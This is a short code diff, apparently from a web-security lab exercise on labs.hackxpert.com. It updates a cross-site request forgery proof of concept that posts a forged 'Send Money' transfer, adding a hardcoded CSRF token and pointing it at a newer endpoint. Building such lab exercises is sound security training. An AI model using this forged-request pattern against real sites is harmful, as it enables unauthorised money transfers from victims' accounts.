@@ -9,7 +9,8 @@ formData.append("from_account", "foo");
 formData.append("to_account", "bar");
 formData.append("amount", 1);
 formData.append("submit", "Send Money");
-fetch("https://labs.hackxpert.com/Testing%20grounds/ComputerSystemsInc/send_money2.php", {
+formData.append("csrf_token", "413b40a09be60c633a9afa35102c1e1ce9ac4d886be31c7af4c457c2039ba2f6");
+fetch("https://labs.hackxpert.com/Testing%20grounds/ComputerSystemsInc/send_money3.php", {
   method: 'POST',
   body: new URLSearchParams(formData)
 });
